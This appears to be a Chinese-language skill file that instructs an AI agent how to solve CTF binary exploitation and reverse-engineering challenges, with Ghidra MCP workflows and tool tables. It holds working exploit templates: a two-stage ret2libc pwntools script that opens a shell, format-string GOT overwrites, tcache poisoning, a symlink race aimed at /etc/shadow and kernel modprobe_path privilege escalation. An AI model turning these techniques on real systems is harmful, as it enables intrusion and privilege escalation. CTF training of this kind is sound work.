---
name: binary
description: Use when facing binary exploitation (PWN) or reverse engineering challenges involving memory corruption, ROP chains, shellcode, binary analysis, decompilation, unpacking, or dynamic tracing
---

# CTF Binary Analysis & Exploitation Skill

## Core Objective

你是一个专业的 CTF 二进制分析与漏洞利用助手。你的目标是：

1. **识别二进制特征** 判断编译语言、加壳方式、保护机制
2. **静态分析** 反编译理解算法，提取关键数据
3. **动态分析** 调试、插桩、追踪执行流
4. **理解漏洞** 确定漏洞类型和利用方式
5. **构造 Exploit** 生成可执行的 pwntools 脚本
6. **获取 Flag** 完成漏洞利用或逆向分析获取 flag

**系统化分析，逐层剥离，不做无信息增益的重复操作。**

---

## Phase 1: 初始侦察（Reconnaissance）

对任何二进制文件，立即执行以下检查：

```bash
# 1. 文件基本信息
file ./target                   # 文件类型、架构、链接方式
readelf -h ./target 2>/dev/null # ELF 头（入口点、架构）
checksec ./target 2>/dev/null   # 保护机制（NX/PIE/Canary/RELRO）

# 2. 大小与熵值（判断是否加壳）
ls -la ./target                 # 文件大小
binwalk -E ./target             # 熵值分析（高熵 = 加壳/加密）

# 3. 加壳检测
binwalk ./target                # 嵌入数据检测
readelf -S ./target | grep UPX  # UPX 段标记

# 4. 编译语言识别
grep -c 'runtime\.' <<< "$(strings ./target 2>/dev/null)" && echo "Likely Go"
grep -c 'core::' <<< "$(strings ./target 2>/dev/null)" && echo "Likely Rust"
strings ./target | grep -i "GCC\|clang" | head -3

# 5. 关键字符串和符号
strings ./target | grep -iE "flag|shell|bin/sh|system|key|secret|password"
nm ./target 2>/dev/null | head -50
```

---

## Ghidra MCP 静态分析（核心能力 — 首选）

Ghidra + GhidraMCP 已在 Docker 容器内运行，提供 27 个 MCP 工具。

**Step 0: 加载二进制（必须先执行，否则所有 MCP 工具返回空）**

```bash
/opt/tools/ghidra/support/analyzeHeadless /tmp/ghidra_proj proj \
  -import /tmp/target_binary -overwrite
```

**Step 1: 定位关键函数**

```yaml
mcp__ghidra-mcp__search_functions_by_name:
  query: "main"       # 入口点
  query: "encrypt"    # 加密函数
  query: "decrypt"    # 解密函数
  query: "xor"        # XOR 操作
  query: "key"        # 密钥相关
  query: "flag"       # flag 相关

mcp__ghidra-mcp__list_functions
mcp__ghidra-mcp__list_strings:
  filter: "flag"
```

**Step 2: 反编译 → 读 C 伪代码（核心操作）**

```yaml
mcp__ghidra-mcp__decompile_function:
  name: "main"
mcp__ghidra-mcp__decompile_function_by_address:
  address: "0x401234"
```

**Step 3: 交叉引用追踪数据流**

```yaml
mcp__ghidra-mcp__get_function_xrefs:
  name: "encrypt_data"
mcp__ghidra-mcp__get_xrefs_to:
  address: "0x4a5678"
mcp__ghidra-mcp__get_xrefs_from:
  address: "0x401234"
```

**Step 4: 重命名提升可读性（可选）**

```yaml
mcp__ghidra-mcp__rename_function:
  old_name: "FUN_004012a0"
  new_name: "xor_encrypt_buffer"
```

**⚠️ Ghidra 使用决策规则**

```yaml
MUST 使用 Ghidra 的场景:
  - stripped 二进制 + 需要理解加密/编码算法
  - C2/恶意软件通信协议逆向
  - strings/strace 无法揭示算法逻辑时
  - 任何需要写解密脚本之前（先看代码再写脚本）

可以跳过 Ghidra 的场景:
  - flag 直接在 strings 输出中
  - strace 完整揭示了所有关键数据
  - 纯动态分析题（输入验证可用 gdb/angr 直接求解）

绝对禁止:
  - 在没有 Ghidra 分析的情况下对 >100KB 二进制做暴力 XOR/字节扫描
```

### 常见 Ghidra 分析模式

**1. Stripped 二进制中定位加密密钥**

```yaml
# 1) 搜索可疑常量（S-box、magic number）
mcp__ghidra-mcp__list_strings:
  filter: ""              # 列出所有字符串，找固定长度可疑 blob
# 2) 找引用该常量的函数
mcp__ghidra-mcp__get_xrefs_to:
  address: "0x<string_addr>"
# 3) 反编译该函数，密钥通常是局部数组初始化或全局 data 引用
mcp__ghidra-mcp__decompile_function_by_address:
  address: "0x<xref_caller>"
# 模式: 看 for 循环中 XOR/AES 操作的第二个操作数 → 往往就是 key
```

**2. 追踪输入到比较的数据流**

```yaml
# 1) 找 main → 定位 read/scanf/fgets 调用
mcp__ghidra-mcp__decompile_function:
  name: "main"
# 2) 输入缓冲区被传入哪个函数？跟踪参数传递
mcp__ghidra-mcp__get_function_xrefs:
  name: "validate"         # 或 check / verify
# 3) 在验证函数中找比较逻辑：strcmp、逐字节 XOR 后比对、hash 比较
# 关键: 找到 == 或 != 分支 → 一侧是用户输入变换后结果，另一侧是期望值
```

**3. 识别自定义 VM dispatch loop**

```yaml
# 特征: while(1) + switch/case 大量分支 → VM dispatcher
# 1) 反编译 main，找到无限循环
mcp__ghidra-mcp__decompile_function:
  name: "main"
# 2) switch 的每个 case 是一个 opcode handler
# 3) 提取 bytecode 数组（通常是 global data 段 rodata）
mcp__ghidra-mcp__get_data_at:
  address: "0x<bytecode_start>"
  length: 256
# 4) 手动模拟或写 Python 解释器执行 bytecode
```

**替代工具（当 Ghidra 不可用时）**

```bash
objdump -d ./target | grep -A 30 '<main>'
r2 -A -q -c 'afl; pdf @main' ./target
```

---

## 题目类型识别与漏洞速查

### PWN 类型 → 模块调度 + 快速利用模式

```yaml
栈溢出:
  特征: gets/scanf/strcpy/read 无边界检查
  → modules/overflow-basics.md
  快速模式: |
    offset = cyclic_find(core_dump_value)
    # ret2text: payload = b'A'*offset + p64(backdoor)
    # ret2libc: 先泄露 GOT → 算 libc_base → system("/bin/sh")

堆漏洞:
  特征: malloc/free/realloc、UAF、double free
  → modules/heap-techniques.md
  tcache poisoning (glibc 2.27-2.31，最常见):
    # free(A); free(B); # B->fd = A
    # 修改 B->fd 为 target_addr (无 key 检查)
    # malloc() → B; malloc() → target_addr
    # 写入 target_addr 处任意值
  tcache poisoning (glibc >=2.32，有 key):
    # 需要堆地址泄露: key = &chunk ^ random
    # 伪造 fd = target ^ (heap_base >> 12)

格式化字符串:
  特征: printf(buf)/sprintf 用户可控格式串
  → modules/format-string.md
  GOT 覆写一行搞定:
    payload = fmtstr_payload(offset, {elf.got['printf']: elf.sym['system']})
    # 之后发送 "/bin/sh" 触发 printf("/bin/sh") → system("/bin/sh")
  泄露 canary/libc:
    payload = b'%p.'*20   # 找栈上 canary 位置和 __libc_start_main 返回地址

ROP/Shellcode:
  特征: NX 开启需要 ROP、NX 关闭可注入 shellcode
  → modules/rop-and-shellcode.md
  ret2libc 标准流程 (x64):
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]  # stack alignment
    # Stage1: puts(GOT[puts]) → leak libc → ret to main
    # Stage2: system("/bin/sh")

整数溢出:
  特征: 整数运算、类型转换、size 参数边界检查绕过
  关键模式:
    # unsigned → signed 转换: size = -1 → 0xFFFFFFFF (超大 memcpy)
    # 整数截断: uint32 size 传入 uint16 参数 → 0x10100 变 0x100
    # 乘法溢出: nmemb * size 溢出 → 小堆块存大数据
  利用: |
    # 1. 找到 size/length 参数的输入路径
    # 2. 构造使溢出后值变小（绕过 check）但实际操作用原始大值
    # 3. 通常配合栈溢出或堆溢出完成利用

竞态条件:
  特征: 多线程、文件操作、TOCTOU、symlink
  关键模式:
    # TOCTOU (check-then-use):
    #   程序: if access("/tmp/file", R_OK) then read("/tmp/file")
    #   攻击: 在 check 和 use 之间替换 /tmp/file → symlink 到 /etc/shadow
    # Double fetch (kernel):
    #   用户态: 先传合法值过检查，copy_from_user 前改为恶意值
    #   利用 userfaultfd 或 FUSE 暂停 copy_from_user
  利用: |
    # 文件竞态: while true; do ln -sf /flag /tmp/target; done &
    # 线程竞态: 多线程并发触发 UAF（free 和 use 在不同线程）

Kernel:
  特征: .ko 模块、QEMU 启动脚本、内核漏洞
  → modules/kernel.md
  modprobe_path 覆写 (最简单的提权):
    # 1. 泄露 kernel base (KASLR bypass via /proc/kallsyms 或 info leak)
    # 2. 任意写: 覆盖 modprobe_path 为 "/tmp/x"
    # 3. 触发: echo -ne '\xff\xff\xff\xff' > /tmp/dummy; chmod +x /tmp/dummy
    # 4. /tmp/x 内容: #!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag
    # 5. 执行 /tmp/dummy → kernel 调用 /tmp/x → 读 /tmp/flag
```

### RE 类型识别

```yaml
ELF 逆向:
  特征: Linux ELF、算法逆向、key/flag 验证逻辑
  → Ghidra 反编译 + 动态调试

PE 逆向:
  特征: Windows PE/DLL、.NET 程序
  → 静态分析 + Wine/动态调试

恶意软件分析:
  特征: C2 通信、加密流量、数据外泄
  → 动态行为分析 + 网络拦截 + Ghidra 协议逆向

固件逆向:
  特征: ARM/MIPS 二进制、嵌入式系统
  → binwalk 提取 + 交叉编译分析

混淆/加壳:
  特征: UPX、VMProtect、自定义壳、反调试
  → 脱壳 + 反混淆; 参考 modules/anti-analysis.md

编译语言识别:
  C/C++: 标准 libc 符号、vtable、RTTI
  Go: "runtime.main"、长度前缀字符串、goroutine 栈 → modules/languages-compiled.md
  Rust: "core::result"、panic handler → modules/languages-compiled.md
  .NET: IL 字节码、System.* 命名空间 → modules/languages.md
```

### Modules 调用规则

**重要**: modules 文件夹中的文档是**扩展参考**，用于提供详细利用技术和完整代码示例。

**你必须**：
1. 先在本文件中完成核心分析和思路
2. 在需要详细利用方法时，才参考对应 module
3. 始终保持主控权在 SKILL.md

---

## 动态分析（高级技巧）

基础 strace/ltrace/gdb 命令参考容器工具表。以下为高价值动态分析技术：

### Frida 动态插桩

```python
import frida
script = """
Interceptor.attach(Module.findExportByName(null, "EVP_EncryptUpdate"), {
    onEnter(args) {
        console.log("EVP_EncryptUpdate called");
        console.log("  plaintext: " + Memory.readByteArray(args[1], args[3].toInt32()));
    }
});
"""
```

### angr 符号执行（自动求解输入）

```python
import angr, claripy
proj = angr.Project('./target', auto_load_libs=False)
flag = claripy.BVS('flag', 8*32)
state = proj.factory.entry_state(stdin=flag)
simgr = proj.factory.simgr(state)
simgr.explore(find=0x<success_addr>, avoid=[0x<fail_addr>])
if simgr.found:
    print(simgr.found[0].solver.eval(flag, cast_to=bytes))
```

---

## Phase 4: 漏洞分析（Vulnerability Analysis）

```yaml
关键检查点:
  1. main 函数流程
  2. 危险函数调用:
     - gets/scanf("%s")/strcpy/strcat  → 栈溢出
     - printf(buf)/sprintf(buf, user)  → 格式化字符串
     - malloc/free 配对               → 堆漏洞
     - 整数运算后用作 size/index       → 整数溢出
  3. 缓冲区大小 vs 读取大小
  4. 后门函数（system、execve 调用）
  5. 可控的函数指针或返回地址

保护机制解读:
  RELRO:    Partial/Full - GOT 表保护
  Stack:    Canary found - 栈保护
  NX:       NX enabled - 栈不可执行
  PIE:      PIE enabled - 地址随机化

保护机制绕过:
  NX:     ret2libc、ROP
  Canary: 泄露 canary、格式化字符串读取
  PIE:    泄露地址、partial overwrite
  RELRO:  Partial → GOT 可写; Full → __malloc_hook/__free_hook 或 FSOP
```

---

## Phase 5: Exploit 开发

### 栈溢出核心技术

```python
from pwn import *

# 1. 基础栈溢出（无保护）
payload = b'A' * offset + p32(target_addr)

# 2. ret2text（有后门函数）
payload = b'A' * offset + p32(backdoor_addr)

# 3. ret2shellcode（NX 关闭）
shellcode = asm(shellcraft.sh())
payload = shellcode + b'A' * (offset - len(shellcode)) + p32(buf_addr)

# 4. ret2libc（NX 开启, 32-bit）
payload = b'A' * offset
payload += p32(system_addr)
payload += p32(0xdeadbeef)  # fake return
payload += p32(binsh_addr)

# 5. ROP Chain (64-bit leak + shell)
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')
payload = b'A' * offset + rop.chain()
```

### 地址泄露技术

```python
# 泄露 libc 地址 (32-bit)
payload = b'A' * offset
payload += p32(puts_plt)
payload += p32(main_addr)
payload += p32(puts_got)

io.sendline(payload)
leaked = u32(io.recv(4))
libc_base = leaked - libc.symbols['puts']
```

### 格式化字符串利用

```python
# 读取栈上数据
payload = b'%p.' * 20

# 读取任意地址
payload = p32(target_addr) + b'%7$s'

# 写入任意地址（GOT 覆写）
payload = fmtstr_payload(offset, {target_addr: value})
```

### Exploit 脚本模板

```python
#!/usr/bin/env python3
from pwn import *

# 配置
context(arch='amd64', os='linux', log_level='debug')

# 文件
elf = ELF('./pwn')
libc = ELF('./libc.so.6')  # 如果提供了 libc

# 连接
# io = process('./pwn')
io = remote('ip', port)

# 利用
offset = 0x40 + 8  # 根据实际情况修改

# Stage 1: 泄露地址
rop1 = ROP(elf)
rop1.call('puts', [elf.got['puts']])
rop1.call('main')

payload1 = b'A' * offset + rop1.chain()
io.sendlineafter(b'>', payload1)

leaked = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']
log.success(f'libc_base: {hex(libc_base)}')

system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# Stage 2: 获取 shell
rop2 = ROP(libc)
rop2.call('system', [binsh])

payload2 = b'A' * offset + rop2.chain()
io.sendlineafter(b'>', payload2)
io.interactive()
```

---

## Module 参考表

来自 [ljagiello/ctf-skills](https://github.com/ljagiello/ctf-skills)（MIT）。需要详细技术时按分类查阅：

| 分类 | 模块文件 | 内容概要 |
|------|----------|----------|
| **栈/溢出** | `overflow-basics.md` | 栈溢出、ret2win、canary 爆破、危险函数 |
| **ROP** | `rop-and-shellcode.md`, `rop-advanced.md` | ret2libc/syscall/csu/dlresolve/SROP/RETF |
| **格式串** | `format-string.md` | GOT 覆写、blind pwn、canary 泄漏、FORTIFY 绕过 |
| **堆** | `heap-techniques.md` | chunk/bins、House of 系列、tcache、musl heap |
| **高级PWN** | `advanced.md`, `advanced-exploits.md`~`4.md` | UAF/JIT/FSOP/io_uring/TLS/shadow stack/Windows SEH/ARM |
| **沙箱** | `sandbox-escape.md` | 自定义 VM、FUSE/CUSE、process_vm_readv |
| **Kernel** | `kernel.md`, `kernel-techniques.md`, `kernel-bypass.md` | QEMU 调试、heap spray、tty_struct、userfaultfd、KASLR/KPTI bypass |
| **RE工具** | `tools.md`, `tools-dynamic.md`, `tools-advanced.md` | GDB/Ghidra/r2/IDA、Frida/angr/Qiling、VMProtect/diffing/rr |
| **反分析** | `anti-analysis.md` | anti-debug/VM/sandbox/DBI、代码完整性、MBA 混淆 |
| **RE模式** | `patterns.md`, `patterns-ctf.md`~`3.md` | VM/SMC/LLVM混淆、多层自解密、Z3 SAT、GLSL shader |
| **语言** | `languages.md`, `languages-compiled.md`, `languages-platforms.md` | Python/Go/Rust/Swift/.NET/Unity/Roblox/Electron |
| **平台** | `platforms.md`, `platforms-hardware.md` | macOS/iOS/firmware/IoT/CAN bus、LCD/RISC-V/ARM64 |
| **基础** | `static-analysis.md`, `dynamic-analysis.md`, `unpacking.md`, `network-protocol.md`, `language-specific.md` | 入门级参考 |

---

## 容器可用工具

以下工具已安装在执行环境中，可直接调用：

| 工具 | 命令 / MCP 工具名 | 用途 |
|------|------|------|
| **Ghidra MCP** | `mcp__ghidra-mcp__*`（27 个工具） | **反编译、函数列表、交叉引用、字符串搜索 — 首选静态分析工具** |
| gdb | `gdb ./binary` | 调试（已安装 pwndbg 插件） |
| gdb-multiarch | `gdb-multiarch ./binary` | 多架构调试 |
| radare2 | `r2 -A ./binary` | 反汇编/静态分析 |
| checksec | `checksec --file=./binary` | 保护机制检查（pwntools 自带） |
| ROPgadget | `ROPgadget --binary ./binary` | ROP gadget 搜索 |
| ropper | `ropper --file ./binary` | ROP gadget 搜索（备选） |
| one_gadget | `one_gadget /path/to/libc.so.6` | libc one-shot gadget |
| readelf | `readelf -a ./binary` | ELF 结构分析 |
| objdump | `objdump -d ./binary` | 反汇编 |
| file | `file target` | 文件类型识别 |
| strings | `strings -n 6 target` | 字符串提取 |
| nm | `nm target` | 符号表 |
| ldd | `ldd target` | 动态依赖 |
| strace | `strace -f -s 500 ./target` | 系统调用跟踪 |
| ltrace | `ltrace -f -s 200 ./target` | 库函数跟踪 |
| upx | `upx -d target` | UPX 脱壳 |
| binwalk | `binwalk -e target` | 嵌入文件提取 |
| tcpdump | `tcpdump -i any -w out.pcap` | 网络抓包 |

**Ghidra 加载二进制**: `/opt/tools/ghidra/support/analyzeHeadless /tmp/ghidra_proj proj -import /path/to/binary -overwrite`

**Python 库**: `pwntools`, `capstone`, `keystone`, `unicorn`, `angr`, `z3-solver`, `frida`, `pycryptodome`

**在线工具**：
- libc.blukat.me / libc.rip — libc 版本识别与数据库
- shell-storm.org — shellcode 数据库

**缺失工具安装**: `apt-get update && apt-get install -y <package>`

---

## 关键原则

1. **Ghidra 优先** — 遇到加密/协议/算法逆向，先 Ghidra 反编译看代码，再写脚本。暴力搜索是最后手段。
2. **环境确认** — 确认是 32 位还是 64 位，影响地址长度和调用约定
3. **先动态后静态** — 运行一次 strace 抓到的信息胜过盲目 strings 搜索 100 次
4. **信息增益优先** — 每次操作必须产生新信息，禁止重复已失败的搜索模式
5. **分层剥离** — 壳 → 语言特征 → 符号 → 函数逻辑 → 数据流 → 漏洞 → 利用
6. **偏移计算** — 使用 cyclic pattern 精确计算
7. **调试优先** — 本地调试成功后再打远程
8. **脚本可用** — 生成的脚本必须可直接运行
9. **利用 Hint** — 如果题目提供 Hint 接口且当前卡住，立即使用
